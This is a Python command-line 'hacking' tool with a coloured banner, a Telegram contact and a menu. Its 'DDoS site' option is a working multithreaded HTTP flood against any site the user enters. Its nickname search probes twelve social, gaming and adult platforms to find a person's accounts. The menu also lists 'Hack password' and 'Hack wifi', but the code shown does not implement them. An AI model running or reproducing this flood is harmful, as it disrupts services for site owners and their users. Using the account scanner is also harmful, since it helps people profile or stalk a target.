import time
import threading
import os
import requests as req
hits = 0
os.system("clear")
#Table of colors
D = "\033[1;30m" # DARK
R = "\033[1;31m" # RED
G = "\033[1;32m" # GREEN
Y = "\033[1;33m" # YELLOW
B = "\033[1;34m" # BLUE
V = "\033[1;35m" # VIOLET
C = "\033[1;36m" # CYAN
W = "\033[1;37m" # WHITE
RE = "\033[0m" # Remove
print(f"""
{W}
{W}   ▟███████▙{RE}{R}  █▟█  ▟█  ▟█  ▟██████▙
{W}   ▝▝▝▟██▛▘▘{RE}{Y}  ██▛▟█▛▘  ██  ██▝▝▝▟█▙
{B}     ▟██▛   {RE}{G}  █████▙   ██  ██   ▟█▛
{B}    ▟██▛    {RE}{C}  ██▛▝██▙  ██  ██   ▟█▛
{R}   ▟███████▙{RE}{B}  ██   ██  ██  ▟██████▛
{R}   ▝▝▝▝▝▝▝▝▘{RE}{V}  ▝▘   ▝▘  ▝▘  ▝▝▝▝▝▝▝
{RE}   {C}TELEGRAM{RE}: {V}cgrokpp{RE} {C}|{RE} {Y}made in Ukraine{RE}
""")
print(f"""
{R}   [1] DDoS site          [2] Search nickname

   [3] Hack password      [4] Hack wifi

   [0] Exit{RE}
""")
while True:
    select = input(f"{V}Zkid>> {RE}")
    if select == "0":
        exit()
    elif select == "1":
        import threading
        urlname = input(f"{Y}Site name: {RE}https://")
        url = "https://" + urlname
        total = int(input(f"{Y}How many hits: {RE}"))
        threads_num = 50
        hits = 0
        lock = threading.Lock()
        def attack():
            global hits
            while hits < total:
                try:
                    req.get(url, timeout=2)
                    with lock:
                        if hits < total:
                            hits += 1
                            print(f"\r{G}Hits: {hits}/{total}{RE}", end="", flush=True)
                except: pass
        print(f"{R}Attacking{RE}")
        threads = []
        for i in range(threads_num):
            t = threading.Thread(target=attack)
            t.start()
            threads.append(t)
        for t in threads: t.join()
        print(f"\n{C}process end{RE}")
    elif select == "2":
        nick = input(f"{Y}Enter nickname: {RE}")
        h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        print(f"{C}Scanning {nick}...{RE}\n")
        s = {
            "Telegram": f"https://t.me/{nick}",
            "Snapchat": f"https://www.snapchat.com/add/{nick}",
            "Instagram": f"https://www.instagram.com/{nick}",
            "TikTok": f"https://www.tiktok.com/@{nick}",
            "GitHub": f"https://github.com/{nick}",
            "YouTube": f"https://www.youtube.com/@{nick}",
            "Twitter": f"https://twitter.com/{nick}",
            "Pinterest": f"https://www.pinterest.com/{nick}",
            "Reddit": f"https://www.reddit.com/user/{nick}",
            "Twitch": f"https://www.twitch.tv/{nick}",
            "Steam": f"https://steamcommunity.com/id/{nick}",
            "PornHub": f"https://www.pornhub.com/users/{nick}"
        }
        for name, url in s.items():
            try:
                r = req.get(url, headers=h, timeout=3)
                if r.status_code == 200:
                    if name == "Telegram" and "view in telegram" not in r.text.lower():
                        print(f"{R}[-] {name}: Not found{RE}")
                    else: print(f"{G}[+] {name}: {url}{RE}")
                elif r.status_code == 404: print(f"{R}[-] {name}: Not found{RE}")
                else: print(f"{Y}[!] {name}: Error {r.status_code}{RE}")
            except: print(f"{Y}[!] {name}: Connection failed{RE}")
        print(f"\n{C}Done{RE}")
